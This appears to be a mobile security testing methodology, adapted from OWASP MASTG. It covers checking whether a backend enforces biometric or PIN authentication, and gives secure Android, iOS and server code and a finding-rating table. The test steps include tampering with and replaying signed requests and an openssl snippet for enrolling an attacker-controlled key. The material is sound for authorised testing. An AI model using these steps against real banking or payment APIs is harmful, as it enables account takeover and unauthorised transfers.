### GT-0020-3: Server-side enforcement of local authentication (Android and iOS)

Guler Tech methodology. Platforms: Android and iOS. Type: dynamic (network); requires the backend API to be in scope. Knowledge: [what the server can know about local authentication](#both-platforms-what-the-server-can-know-about-local-authentication).

#### Overview

For connected apps, local authentication matters to the server only if the server checks evidence of it. This test establishes what evidence the app sends for each locally protected operation, and whether the server requires it, validates it, and refuses it when it is missing, replayed, altered or produced with a key the attacker enrolled. It is a server-side authorisation test (OWASP WSTG-ATHN-04 and WSTG-ATHZ-02; ASVS 5.0 V6 and V8) driven from the mobile client. It also covers OWASP's "Local-Only Enforcement" mode: the server trusting a client-side Boolean.

#### Prerequisites

- An interception proxy with the app's traffic visible, including any certificate-pinning bypass needed ([MASTG-TECH-0011](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0011/), [MASTG-TECH-0063](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0063/)).
- Written confirmation that the API is in scope, and test accounts with test funds or a sandbox for payment-like operations.
- `openssl` for generating an attacker key pair.
- The list of locally protected operations, and the results of GT-0020-1 or MASTG-TEST-0267 (so you know whether the local prompt can be bypassed).

#### Steps

1. **Record the evidence.** Perform each protected operation with genuine local authentication and save the request. Look for a signature header or field, a signed token, a WebAuthn assertion (`authenticatorData`, `clientDataJSON`, `signature`), a challenge identifier, or a Boolean such as `biometricVerified`. Then, if the app lets you disable biometrics in its settings, perform the same operation with the alternative path (password re-entry, app PIN) and diff the requests.

2. **Remove the evidence.** In Burp Repeater, resend the request without the signature (delete the header or field) and with it set to an empty string. If the request carries a Boolean, set it to `true` on a device where you never authenticated, and to `false` on one where you did.

3. **Replay it.** Resend the original signed request unchanged — once immediately, once after several minutes, and once after a fresh login (a new session token). A server that accepts the same signature twice is not using single-use challenges.

4. **Alter the signed content.** Change the amount, payee or new phone number in the request while keeping the signature. If the server accepts it, the signature does not cover the operation details.

5. **Test the challenge.** Request two challenges and use the first after the second; use a challenge issued to a different session or account; wait past any stated expiry. Check whether the challenge is server-generated at all (a timestamp or client nonce in the signed data is a weak sign).

6. **Enrol your own key.** Find the endpoint that registers the device public key (usually called during "enable Face ID login" or device binding). Generate an attacker key and register it using only an existing session:

   ```bash
   openssl ecparam -name prime256v1 -genkey -noout -out attacker.pem
   openssl ec -in attacker.pem -pubout -outform DER 2>/dev/null | base64 | tr -d '\n' > attacker_pub.b64
   # replay the enrolment request with attacker_pub.b64 in place of the app's public key
   # then sign a server challenge exactly as the app does, for example:
   printf '%s' "$CHALLENGE_AND_PAYLOAD" | openssl dgst -sha256 -sign attacker.pem | base64 | tr -d '\n'
   ```

   If enrolment succeeds without step-up authentication and the server then accepts operations signed with your key, any session theft becomes full use of "biometric-protected" operations from any machine. For Android apps that send a key attestation chain, also try enrolling without the chain, or with a chain from a key generated without user authentication, to see whether the server checks it.

7. **Check what the server does after a bypass.** Combine with GT-0020-1 or MASTG-TEST-0267: with the local prompt bypassed, does the operation succeed end to end? If the design is crypto-bound and server-verified, the bypassed app cannot produce a valid signature and the server refuses.

#### Observation

Per operation: the evidence sent (none, flag, signature, assertion), the server's response to its removal, replay, alteration and stale challenges, the enrolment endpoint's requirements, and whether an attacker-enrolled key is accepted.

#### Evaluation

The test **fails** for a sensitive operation if the server:

- accepts the operation with only the session token, when the app presents it as protected by local authentication;
- trusts a client-supplied flag about local authentication;
- accepts a request without the signature, with a replayed signature, with a signature over different content, or with an expired or foreign challenge;
- lets a new public key be bound to the account without step-up authentication, or (for Android) does not verify that a bound key's attestation shows user authentication is required.

It **passes** if every sensitive operation requires a valid signature (or WebAuthn assertion with the UV flag) over a fresh, single-use, server-issued challenge that covers the operation details, made by a key bound to the account through an authenticated enrolment.

If the API is out of scope, report what you observed from the client (step 1) — for example "no evidence of local authentication is sent; the server cannot distinguish an authenticated request from a bypassed one" — and recommend a backend test.

#### Demo

A lab banking app protects transfers with Face ID. The captured request after a genuine authentication:

```text
POST /v2/transfers HTTP/2
Host: api.example.com
Authorization: Bearer <session token>
Content-Type: application/json

{"fromAccount":"12345678","toIban":"GB00EXMP00000000000000","amount":"25.00","currency":"GBP","biometricVerified":true}
```

Step 2: resending it from Repeater with `"biometricVerified":false` returns `201 Created`; so does removing the field. The server never checks local authentication; the field is informational. Combined with MASTG-TEST-0267, where `ios ui biometrics_bypass` let the app reach this request without Face ID, and with any session-token theft, transfers need nothing but the token. The test fails, and the client-side bypass is upgraded from "local UI bypass" to a server-side authorisation flaw (CWE-602, CWE-603).

## Best practices

OWASP links two best practices to MASWE-0020, both for Android. We expand each with working code; the iOS, PIN and server-side counterparts follow in [Secure implementation](#secure-implementation).

### MASTG-BEST-0036: Use Cryptographic Binding for Biometric Authentication

Source: [MASTG-BEST-0036](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0036/). Platform: Android.

For sensitive operations, call `BiometricPrompt.authenticate(promptInfo, cryptoObject)` with a `CryptoObject` over an Android Keystore key generated with `setUserAuthenticationRequired(true)` and `setUserAuthenticationParameters(0, type)`. The key then refuses to operate until this prompt succeeds, and the timeout of `0` means every operation needs its own authentication. `setUserAuthenticationValidityDurationSeconds(int)` is deprecated from API 30; on older `minSdk`, its value `-1` is the per-operation equivalent.

The practice only works if the protected value is *produced* by the key operation. The example below keeps a refresh token as AES-GCM ciphertext under a per-operation, Class 3-biometric key, so the callback can only obtain the token by decrypting it.

```kotlin
private const val ALIAS = "token_vault_v1"
private val keyStore: KeyStore = KeyStore.getInstance("AndroidKeyStore").apply { load(null) }

fun createVaultKey() {
    val spec = KeyGenParameterSpec.Builder(ALIAS,
            KeyProperties.PURPOSE_ENCRYPT or KeyProperties.PURPOSE_DECRYPT)
        .setKeySize(256)
        .setBlockModes(KeyProperties.BLOCK_MODE_GCM)
        .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)
        .setUserAuthenticationRequired(true)
        .setUserAuthenticationParameters(0, KeyProperties.AUTH_BIOMETRIC_STRONG) // per operation, Class 3
        .setInvalidatedByBiometricEnrollment(true)                                // the default, made explicit
        .setUnlockedDeviceRequired(true)
        .build()
    KeyGenerator.getInstance(KeyProperties.KEY_ALGORITHM_AES, "AndroidKeyStore")
        .apply { init(spec) }
        .generateKey()
}

private fun vaultCipher(mode: Int, iv: ByteArray? = null): Cipher {
    val key = keyStore.getKey(ALIAS, null) as SecretKey
    return Cipher.getInstance("AES/GCM/NoPadding").apply {
        if (iv == null) init(mode, key) else init(mode, key, GCMParameterSpec(128, iv))
    }
}

class EncryptedBlob(val iv: ByteArray, val ciphertext: ByteArray)   // safe to persist in preferences
```

Enrolment (the user has just signed in with their password and turned on biometric unlock) encrypts the token through a prompt, and stores only ciphertext:

```kotlin
fun enableBiometricUnlock(activity: FragmentActivity, refreshToken: ByteArray, onStored: (EncryptedBlob) -> Unit) {
    createVaultKey()
    authenticate(activity, "Turn on biometric unlock", vaultCipher(Cipher.ENCRYPT_MODE)) { cipher ->
        onStored(EncryptedBlob(cipher.iv, cipher.doFinal(refreshToken)))
        refreshToken.fill(0)                                  // no plaintext copy survives
    }
}
```

Unlock decrypts it; any failure, including an invalidated key, ends in re-login, never in a fallback:

```kotlin
fun unlockWithBiometrics(activity: FragmentActivity, blob: EncryptedBlob,
                         onToken: (ByteArray) -> Unit, onReLogin: () -> Unit) {
    val cipher = try {
        vaultCipher(Cipher.DECRYPT_MODE, blob.iv)
    } catch (e: KeyPermanentlyInvalidatedException) {
        keyStore.deleteEntry(ALIAS)                           // biometrics or lock screen changed
        return onReLogin()
    }
    authenticate(activity, "Unlock your account", cipher, onError = onReLogin) { authorised ->
        onToken(authorised.doFinal(blob.ciphertext))          // the only way to obtain the token
    }
}

private fun authenticate(activity: FragmentActivity, title: String, cipher: Cipher,
                         onError: () -> Unit = {}, onAuthorised: (Cipher) -> Unit) {
    val callback = object : BiometricPrompt.AuthenticationCallback() {
        override fun onAuthenticationSucceeded(result: BiometricPrompt.AuthenticationResult) {
            val authorised = result.cryptoObject?.cipher ?: return onError()
            try {
                onAuthorised(authorised)
            } catch (e: GeneralSecurityException) {
                onError()                                     // never continue without the crypto result
            }
        }
        override fun onAuthenticationError(errorCode: Int, errString: CharSequence) = onError()
    }
    val info = BiometricPrompt.PromptInfo.Builder()
        .setTitle(title)
        .setAllowedAuthenticators(BiometricManager.Authenticators.BIOMETRIC_STRONG)
        .setNegativeButtonText("Use password")
        .build()
    BiometricPrompt(activity, ContextCompat.getMainExecutor(activity), callback)
        .authenticate(info, BiometricPrompt.CryptoObject(cipher))
}
```

Points that reviewers and testers should check against this pattern:

- The token is held in memory only for as long as it is needed to obtain an access token; it is not written back to storage in plaintext.
- "Use password" leads to full server authentication, not to an app PIN compared locally.
- If the token is used to call a server, the server-side half still matters: for operations that need proof of the user's presence *now*, sign a server challenge with a per-operation EC key instead (the signing variant is in our [MASWE-0016 note](/mobile/maswe-0016-key-access-not-restricted/#android-transaction-signing-key-bound-to-strong-biometrics)).
- Running [GT-0020-1](#gt-0020-1-runtime-bypass-of-biometricprompt-android) against this code ends at `IllegalBlockSizeException`, and the app returns to the login screen.

### MASTG-BEST-0038: Require Explicit User Confirmation for Biometric Authentication

Source: [MASTG-BEST-0038](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0038/). Platform: Android.

For operations that need the user's explicit authorisation — payments, access to health data, consent to share identity attributes — keep explicit confirmation on: call `setConfirmationRequired(true)` on `BiometricPrompt.PromptInfo.Builder` (or the framework `BiometricPrompt.Builder`), or simply do not call it, since `true` is the default. With `false`, passive modalities such as face recognition can complete as soon as the sensor sees the user, so authentication may happen without the user deliberately approving the operation. Android's documentation presents confirmation as the assurance that the user intentionally initiated the action.

```kotlin
val info = BiometricPrompt.PromptInfo.Builder()
    .setTitle("Confirm payment")
    .setSubtitle("£25.00 to J. Smith")                       // show what is being approved
    .setAllowedAuthenticators(BiometricManager.Authenticators.BIOMETRIC_STRONG)
    .setConfirmationRequired(true)                          // the default; explicit for reviewers
    .setNegativeButtonText("Cancel")
    .build()
```

Two practical additions. First, start the prompt only from an explicit user action (tapping "Pay"), never automatically when a screen opens. Second, the prompt's text is rendered by the system but chosen by the app, so it is not a trusted record of what was approved; where the device supports it, Android Protected Confirmation binds the signed data to text shown by trusted hardware (see the [MASWE-0016 note](/mobile/maswe-0016-key-access-not-restricted/#android-unlocked-device-user-presence-and-protected-confirmation)). On iOS there is no equivalent switch — Face ID's "Require Attention" setting belongs to the user — so the same two additions are the design control.

## Secure implementation

These patterns are Guler Tech recommendations for the parts of MASWE-0020 that the OWASP best practices do not cover.

### iOS: let the Keychain do the authentication

Store the secret with a user-presence access control and read it with a fresh `LAContext`; do not call `evaluatePolicy` and then read an unprotected value. The full store/read pair (including `kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly`, access groups and avoiding cached copies) is in our [MASWE-0016 note](/mobile/maswe-0016-key-access-not-restricted/#ios-keychain-secret-readable-only-with-user-presence-on-this-device). The part specific to local authentication is how the read behaves under attack and how errors are handled:

```swift
enum UnlockResult { case token(Data), cancelled, reLogin }

func unlockRefreshToken() -> UnlockResult {         // call off the main thread
    let context = LAContext()
    context.localizedReason = "Unlock your account"
    context.touchIDAuthenticationAllowableReuseDuration = 0
    let query: [String: Any] = [
        kSecClass as String: kSecClassGenericPassword,
        kSecAttrService as String: "com.example.auth",
        kSecAttrAccount as String: "refresh-token",
        kSecReturnData as String: true,
        kSecMatchLimit as String: kSecMatchLimitOne,
        kSecUseAuthenticationContext as String: context
    ]
    var out: CFTypeRef?
    switch SecItemCopyMatching(query as CFDictionary, &out) {
    case errSecSuccess:
        return (out as? Data).map(UnlockResult.token) ?? .reLogin
    case errSecUserCanceled:
        return .cancelled
    default:                                         // auth failed, item invalidated, not found
        return .reLogin                              // never fall back to a copy stored elsewhere
    }
}
```

Under objection's `ios ui biometrics_bypass` this code is unaffected: there is no `evaluatePolicy` reply to forge, and the Keychain's own prompt cannot be answered from the app. If the UX needs an `LAContext` evaluation first (for example to show the prompt before a network call), evaluate it and pass *that* context in `kSecUseAuthenticationContext`; the Keychain will honour the system-tracked authentication, not the app's Boolean.

### iOS: an app PIN bound to the Keychain

When the product requires an app PIN, make it an input to the item's protection with `.applicationPassword`, and combine it with biometrics so each guess also needs an OS-throttled factor:

```swift
func storeVaultKey(_ vaultKey: Data, pin: String) throws {
    var error: Unmanaged<CFError>?
    guard let access = SecAccessControlCreateWithFlags(
        nil,
        kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
        [.applicationPassword, .and, .biometryCurrentSet],   // PIN AND current biometrics
        &error
    ) else { throw error!.takeRetainedValue() as Error }

    let context = LAContext()
    guard context.setCredential(Data(pin.utf8), type: .applicationPassword) else {
        throw NSError(domain: NSOSStatusErrorDomain, code: Int(errSecParam))
    }
    let attributes: [String: Any] = [
        kSecClass as String: kSecClassGenericPassword,
        kSecAttrService as String: "com.example.vault",
        kSecAttrAccount as String: "vault-key",
        kSecAttrAccessControl as String: access,
        kSecUseAuthenticationContext as String: context,
        kSecValueData as String: vaultKey
    ]
    let status = SecItemAdd(attributes as CFDictionary, nil)
    guard status == errSecSuccess else { throw NSError(domain: NSOSStatusErrorDomain, code: Int(status)) }
}
```

Reading uses the same query with a context that carries the PIN the user just typed; a wrong PIN returns an error instead of data, and the app never stores or compares the PIN. Test the flag combination on every iOS version you support, keep a server-side recovery path (a forgotten PIN means the item is unrecoverable), and if you need a hard attempt limit, count attempts on the server rather than in `UserDefaults`.

### Android: app PINs

Android has no `.applicationPassword` equivalent, and no app-accessible secure hardware that throttles guesses at a short PIN. Choose one of these, in order of preference:

1. **Verify the PIN on the server.** Send it over TLS (pinned) together with a signature from a device-bound Keystore key, so the server knows which device is asking; the server enforces an account-level attempt limit and locks or escalates to full re-authentication. Store nothing PIN-derived on the device. This is the only option that resists an attacker who can read app storage and run code in the app.
2. **Combine the PIN with an auth-bound key.** If the PIN must work offline, verify it as `HMAC(K, pin)` where `K` is a Keystore HMAC key created with per-operation biometric authentication, so every guess needs a biometric; nothing searchable leaves the Keystore.
3. **Otherwise, call it what it is.** A PIN checked locally against stored data is a convenience lock against casual access. It can be acceptable for L1 apps if the secrets it guards are encrypted under an auth-bound key (MASTG-BEST-0036) rather than by the PIN, and the report should say so.

In all three, do not represent "unlocked" as a stored flag: the unlocked state is having the decrypted session secret in memory; locking (including on background timeout) means discarding it.

### Server: verify, do not trust

The server side of a crypto-bound design, in outline (Kotlin on the JVM):

```kotlin
fun verifyConsent(account: Account, challengeId: String, operation: ByteArray, signature: ByteArray): Boolean {
    val challenge = challenges.consume(challengeId) ?: return false       // single use; deleted on read
    if (challenge.accountId != account.id || challenge.isExpired()) return false
    if (!challenge.operationHash.contentEquals(sha256(operation))) return false  // signed what was shown
    val publicKey = account.boundDeviceKey ?: return false               // bound after step-up, attested
    return Signature.getInstance("SHA256withECDSA").run {
        initVerify(publicKey)
        update(challenge.nonce)
        update(operation)
        verify(signature)
    }
}
```

Bind device keys only after strong authentication (MASWE-0023), verify Android key attestation at binding time (`noAuthRequired` absent, `userAuthType` includes biometric, no `authTimeout` for per-operation keys, in the hardware-enforced list), and reject any sensitive request that does not carry a valid signature — there is no "legacy client" exception. Where passkeys fit the product, they give the same property with less custom code: request `userVerification: "required"` and check the UV flag on every assertion.

## Rating findings

Rate on three things: what the bypassed authentication protects, what the attacker needs (code execution in the app on a compromised device, brief physical access to an unlocked phone, or nothing beyond the phone), and whether the server relies on the client's decision.

| Rating | Conditions |
|---|---|
| **Critical** | Local authentication over payments, transaction signing, credential presentation or account takeover-relevant actions can be bypassed **without device compromise**: a hardcoded or master PIN in a release build, a lock screen dismissible with Back or by launching another activity, or a server that binds an attacker-supplied device key with only a session token and then accepts its signatures for high-value operations. |
| **High** | Event-bound biometrics (`authenticate` without `CryptoObject`, `evaluatePolicy` without Keychain access control), a `CryptoObject` over a key without authentication, or a UI-only app PIN protecting high-value operations or long-lived session secrets, **demonstrated** with GT-0020-1, MASTG-TEST-0267 or GT-0020-2 to yield the secret or operation; a server that accepts sensitive operations without evidence of local authentication, or trusts a client flag, while the app presents them as protected; an offline-searchable PIN verifier stored next to the token it protects; a plaintext refresh token behind an app lock; a validity window of hours on a key used for payments or consent. |
| **Medium** | The same patterns over moderately sensitive data (balances, statements, profile data); validity windows of minutes on sensitive keys; an attempt counter that can be reset, with a slow KDF verifier; `setConfirmationRequired(false)` on a prompt that authorises payments (otherwise crypto-bound); signatures that cover a nonce but not the operation details, or challenges that can be replayed within a session; a server-verified PIN without account-level throttling. |
| **Low** | `setConfirmationRequired(false)` on lower-risk sensitive flows; short windows (tens of seconds) without a documented reason; an app lock that re-engages later than the advertised timeout; Android key attestation present but not verified by the server; `kSecUseOperationPrompt` or other deprecated APIs with no security impact. |
| **Info** | Event-bound prompts over non-sensitive content (hiding the balance on the home screen); local PIN locks documented as convenience locks in L1 apps with the session secret correctly protected; observations that could not be tested end to end because the API was out of scope. |

When you report, state which pattern you found (event-bound, unbound `CryptoObject`, time-bound, UI-only PIN, local-only enforcement), the evidence from the static test (decompiled call, decoded flags), the dynamic proof (Frida or objection output, the protected screen or redacted secret), and — where tested — the server's response. Be explicit about the attacker model: "requires code execution in the app process (rooted or jailbroken device, or a malicious SDK)" is not a reason to downgrade a MASWE-0020 finding in an L2 app; it is the threat the weakness describes. Conversely, do not rate the existence of a Frida hook on its own; rate what it yielded.

## References

- OWASP MASWE — [MASWE-0020: Local Authentication Can Be Bypassed](https://mas.owasp.org/MASWE/MASVS-AUTH/MASWE-0020/) (CC BY-SA 4.0)
- OWASP MASWE — related weaknesses [MASWE-0016](https://mas.owasp.org/MASWE/MASVS-CRYPTO/MASWE-0016/), [MASWE-0017](https://mas.owasp.org/MASWE/MASVS-CRYPTO/MASWE-0017/), [MASWE-0018](https://mas.owasp.org/MASWE/MASVS-AUTH/MASWE-0018/), [MASWE-0021](https://mas.owasp.org/MASWE/MASVS-AUTH/MASWE-0021/), [MASWE-0022](https://mas.owasp.org/MASWE/MASVS-AUTH/MASWE-0022/), [MASWE-0023](https://mas.owasp.org/MASWE/MASVS-AUTH/MASWE-0023/), [MASWE-0025](https://mas.owasp.org/MASWE/MASVS-AUTH/MASWE-0025/) (CC BY-SA 4.0)
- OWASP MAS Profiles — [MAS-L2](https://mas.owasp.org/Profiles/MAS-L2/) and [MAS-EUDIW](https://mas.owasp.org/Profiles/MAS-EUDIW/) (CC BY-SA 4.0)
- OWASP MASTG — knowledge [MASTG-KNOW-0001: Biometric Authentication](https://mas.owasp.org/MASTG/knowledge/android/MASVS-AUTH/MASTG-KNOW-0001/), [MASTG-KNOW-0043: Android KeyStore](https://mas.owasp.org/MASTG/knowledge/android/MASVS-STORAGE/MASTG-KNOW-0043/), [MASTG-KNOW-0047: Cryptographic Key Storage](https://mas.owasp.org/MASTG/knowledge/android/MASVS-STORAGE/MASTG-KNOW-0047/), [MASTG-KNOW-0012: Key Generation](https://mas.owasp.org/MASTG/knowledge/android/MASVS-CRYPTO/MASTG-KNOW-0012/) (CC BY-SA 4.0)
- OWASP MASTG — knowledge [MASTG-KNOW-0056: Local Authentication Framework](https://mas.owasp.org/MASTG/knowledge/ios/MASVS-AUTH/MASTG-KNOW-0056/) and [MASTG-KNOW-0057: Keychain Services](https://mas.owasp.org/MASTG/knowledge/ios/MASVS-AUTH/MASTG-KNOW-0057/) (CC BY-SA 4.0)
- OWASP MASTG — tests [MASTG-TEST-0327](https://mas.owasp.org/MASTG/tests/android/MASVS-AUTH/MASTG-TEST-0327/), [MASTG-TEST-0329](https://mas.owasp.org/MASTG/tests/android/MASVS-AUTH/MASTG-TEST-0329/), [MASTG-TEST-0330](https://mas.owasp.org/MASTG/tests/android/MASVS-AUTH/MASTG-TEST-0330/), [MASTG-TEST-0266](https://mas.owasp.org/MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0266/), [MASTG-TEST-0267](https://mas.owasp.org/MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0267/); legacy (MASTG v1) tests [MASTG-TEST-0017](https://mas.owasp.org/MASTG/tests/android/MASVS-AUTH/MASTG-TEST-0017/), [MASTG-TEST-0018](https://mas.owasp.org/MASTG/tests/android/MASVS-AUTH/MASTG-TEST-0018/), [MASTG-TEST-0064](https://mas.owasp.org/MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0064/) (CC BY-SA 4.0)
- OWASP MASTG — best practices [MASTG-BEST-0036: Use Cryptographic Binding for Biometric Authentication](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0036/) and [MASTG-BEST-0038: Require Explicit User Confirmation for Biometric Authentication](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0038/) (CC BY-SA 4.0)
- OWASP MASTG — demos [MASTG-DEMO-0090](https://mas.owasp.org/MASTG/demos/android/MASVS-AUTH/MASTG-DEMO-0090/MASTG-DEMO-0090/), [MASTG-DEMO-0092](https://mas.owasp.org/MASTG/demos/android/MASVS-AUTH/MASTG-DEMO-0092/MASTG-DEMO-0092/), [MASTG-DEMO-0093](https://mas.owasp.org/MASTG/demos/android/MASVS-AUTH/MASTG-DEMO-0093/MASTG-DEMO-0093/), [MASTG-DEMO-0041](https://mas.owasp.org/MASTG/demos/ios/MASVS-AUTH/MASTG-DEMO-0041/MASTG-DEMO-0041/), [MASTG-DEMO-0042](https://mas.owasp.org/MASTG/demos/ios/MASVS-AUTH/MASTG-DEMO-0042/MASTG-DEMO-0042/), [MASTG-DEMO-0047](https://mas.owasp.org/MASTG/demos/ios/MASVS-AUTH/MASTG-DEMO-0047/MASTG-DEMO-0047/) (CC BY-SA 4.0)
- OWASP MASTG — techniques [MASTG-TECH-0008](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0008/), [MASTG-TECH-0011](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0011/), [MASTG-TECH-0013](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0013/), [MASTG-TECH-0014](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0014/), [MASTG-TECH-0038](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0038/), [MASTG-TECH-0039](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0039/), [MASTG-TECH-0043](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0043/), [MASTG-TECH-0156](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0156/), [MASTG-TECH-0056](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0056/), [MASTG-TECH-0058](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/), [MASTG-TECH-0059](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0059/), [MASTG-TECH-0061](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0061/), [MASTG-TECH-0063](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0063/), [MASTG-TECH-0066](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0066/), [MASTG-TECH-0095](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0095/), [MASTG-TECH-0135](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0135/), [MASTG-TECH-0146](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0146/) (CC BY-SA 4.0)
- OWASP MASTG — tools [jadx (MASTG-TOOL-0018)](https://mas.owasp.org/MASTG/tools/android/MASTG-TOOL-0018/), [semgrep (MASTG-TOOL-0110)](https://mas.owasp.org/MASTG/tools/generic/MASTG-TOOL-0110/), [objection (MASTG-TOOL-0038)](https://mas.owasp.org/MASTG/tools/generic/MASTG-TOOL-0038/), [Frida for iOS (MASTG-TOOL-0039)](https://mas.owasp.org/MASTG/tools/ios/MASTG-TOOL-0039/), [radare2 for iOS (MASTG-TOOL-0073)](https://mas.owasp.org/MASTG/tools/ios/MASTG-TOOL-0073/) (CC BY-SA 4.0)
- OWASP — [Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) (WSTG-ATHN-03, WSTG-ATHN-04, WSTG-ATHZ-02) and [Application Security Verification Standard 5.0](https://owasp.org/www-project-application-security-verification-standard/) (V6 Authentication, V8 Authorization)
- [Android Developers — Show a biometric authentication dialog](https://developer.android.com/identity/sign-in/biometric-auth), including [cryptographic solutions](https://developer.android.com/training/sign-in/biometric-auth#crypto) and [authentication without explicit user action](https://developer.android.com/identity/sign-in/biometric-auth#no-explicit-user-action)
- [Android Developers — `androidx.biometric.BiometricPrompt`](https://developer.android.com/reference/androidx/biometric/BiometricPrompt), [`BiometricPrompt.CryptoObject`](https://developer.android.com/reference/androidx/biometric/BiometricPrompt.CryptoObject), [`android.hardware.biometrics.BiometricPrompt`](https://developer.android.com/reference/android/hardware/biometrics/BiometricPrompt), [`KeyGenParameterSpec.Builder`](https://developer.android.com/reference/android/security/keystore/KeyGenParameterSpec.Builder), [Android Keystore system](https://developer.android.com/privacy-and-security/keystore)
- [AOSP — Biometrics](https://source.android.com/docs/security/features/biometric) and [Authentication](https://source.android.com/docs/security/features/authentication) (Gatekeeper, hardware authentication tokens)
- [Apple — LocalAuthentication](https://developer.apple.com/documentation/localauthentication), [`evaluatePolicy(_:localizedReason:reply:)`](https://developer.apple.com/documentation/localauthentication/lacontext/evaluatepolicy%28_:localizedreason:reply:%29), [Accessing keychain items with Face ID or Touch ID](https://developer.apple.com/documentation/localauthentication/accessing-keychain-items-with-face-id-or-touch-id)
- [Apple — `SecAccessControlCreateWithFlags`](https://developer.apple.com/documentation/security/secaccesscontrolcreatewithflags%28_:_:_:_:%29), [`SecAccessControlCreateFlags`](https://developer.apple.com/documentation/security/secaccesscontrolcreateflags), [`applicationPassword`](https://developer.apple.com/documentation/security/secaccesscontrolcreateflags/applicationpassword), [`kSecUseAuthenticationContext`](https://developer.apple.com/documentation/security/ksecuseauthenticationcontext)
- [Reversec Labs — How secure is your Android Keystore authentication?](https://labs.reversec.com/posts/2019/08/how-secure-is-your-android-keystore-authentication) and the [android-keystore-audit Frida scripts](https://github.com/ReversecLabs/android-keystore-audit)
- [objection wiki — Understanding the iOS Biometrics Bypass](https://github.com/sensepost/objection/wiki/Understanding-the-iOS-Biometrics-Bypass)
- [NIST SP 800-63B-4 — Digital Identity Guidelines: Authentication and Authenticator Management](https://pages.nist.gov/800-63-4/sp800-63b.html)
- [W3C — Web Authentication Level 3](https://www.w3.org/TR/webauthn-3/) and [FIDO Alliance — Passkeys](https://fidoalliance.org/passkeys/)
- CWE — [CWE-285](https://cwe.mitre.org/data/definitions/285.html), [CWE-287](https://cwe.mitre.org/data/definitions/287.html), [CWE-312](https://cwe.mitre.org/data/definitions/312.html), [CWE-319](https://cwe.mitre.org/data/definitions/319.html), [CWE-326](https://cwe.mitre.org/data/definitions/326.html), [CWE-602](https://cwe.mitre.org/data/definitions/602.html), [CWE-603](https://cwe.mitre.org/data/definitions/603.html), [CWE-863](https://cwe.mitre.org/data/definitions/863.html), [CWE-922](https://cwe.mitre.org/data/definitions/922.html)

> Adapted and extended from the OWASP MASWE and MASTG (https://mas.owasp.org), licensed under CC BY-SA 4.0. This note is distributed under the same licence.
